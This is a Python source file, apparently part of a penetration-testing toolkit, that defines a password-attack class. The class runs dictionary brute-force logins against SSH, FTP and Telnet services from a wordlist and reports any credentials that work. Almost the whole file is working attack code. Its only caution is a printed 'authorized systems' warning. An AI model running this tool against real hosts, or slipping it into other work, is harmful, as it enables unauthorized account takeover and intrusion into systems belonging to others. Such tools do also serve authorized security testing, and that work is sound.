"""
Password Attack Module
Brute force and dictionary attacks for various protocols
"""

import paramiko
import ftplib
import socket
from typing import Optional, Dict
import logging
from rich.console import Console
from rich.progress import Progress
from urllib.parse import urlparse

console = Console()
logger = logging.getLogger(__name__)

class PasswordAttacker:
    """Password brute force and dictionary attacks"""
    
    def __init__(self, target: str, username: str, wordlist: str, threads: int = 5):
        self.target = target
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        
        # Parse target
        parsed = urlparse(target)
        self.protocol = parsed.scheme or 'ssh'
        self.host = parsed.hostname or parsed.path
        self.port = parsed.port or self._get_default_port(self.protocol)
    
    def _get_default_port(self, protocol: str) -> int:
        """Get default port for protocol"""
        ports = {
            'ssh': 22,
            'ftp': 21,
            'telnet': 23,
            'smtp': 25,
            'http': 80,
            'https': 443,
            'mysql': 3306,
            'postgresql': 5432,
            'rdp': 3389
        }
        return ports.get(protocol, 22)
    
    def _load_wordlist(self) -> list:
        """Load passwords from wordlist"""
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error loading wordlist: {e}")
            return []
    
    def _try_ssh(self, password: str) -> bool:
        """Try SSH login"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                self.host,
                port=self.port,
                username=self.username,
                password=password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            
            client.close()
            return True
        
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            logger.debug(f"SSH error: {e}")
            return False
    
    def _try_ftp(self, password: str) -> bool:
        """Try FTP login"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=5)
            ftp.login(self.username, password)
            ftp.quit()
            return True
        
        except ftplib.error_perm:
            return False
        except Exception as e:
            logger.debug(f"FTP error: {e}")
            return False
    
    def _try_telnet(self, password: str) -> bool:
        """Try Telnet login"""
        try:
            import telnetlib
            tn = telnetlib.Telnet(self.host, self.port, timeout=5)
            
            tn.read_until(b"login: ")
            tn.write(self.username.encode('ascii') + b"\n")
            
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")
            
            response = tn.read_some()
            tn.close()
            
            if b"incorrect" not in response.lower() and b"failed" not in response.lower():
                return True
            
            return False
        
        except Exception as e:
            logger.debug(f"Telnet error: {e}")
            return False
    
    def attack(self) -> Optional[Dict]:
        """Execute password attack"""
        console.print(f"[bold cyan]Starting password attack[/bold cyan]")
        console.print(f"[yellow]Target: {self.host}:{self.port} ({self.protocol})[/yellow]")
        console.print(f"[yellow]Username: {self.username}[/yellow]")
        console.print(f"[bold red]⚠ Only use on authorized systems![/bold red]\n")
        
        # Load wordlist
        passwords = self._load_wordlist()
        
        if not passwords:
            console.print("[red]Failed to load wordlist[/red]")
            return None
        
        console.print(f"[cyan]Loaded {len(passwords)} passwords from wordlist[/cyan]\n")
        
        # Select attack function
        attack_functions = {
            'ssh': self._try_ssh,
            'ftp': self._try_ftp,
            'telnet': self._try_telnet
        }
        
        if self.protocol not in attack_functions:
            console.print(f"[red]Protocol not supported: {self.protocol}[/red]")
            return None
        
        attack_func = attack_functions[self.protocol]
        
        # Try passwords
        with Progress(console=console) as progress:
            task = progress.add_task("[cyan]Trying passwords...", total=len(passwords))
            
            for password in passwords:
                try:
                    if attack_func(password):
                        console.print(f"\n[bold green]✓ SUCCESS![/bold green]")
                        console.print(f"[green]Password found: {password}[/green]")
                        
                        return {
                            'host': self.host,
                            'port': self.port,
                            'protocol': self.protocol,
                            'username': self.username,
                            'password': password
                        }
                
                except KeyboardInterrupt:
                    console.print("\n[yellow]Attack interrupted by user[/yellow]")
                    return None
                
                progress.update(task, advance=1)
        
        console.print("\n[red]✗ Password not found in wordlist[/red]")
        return None
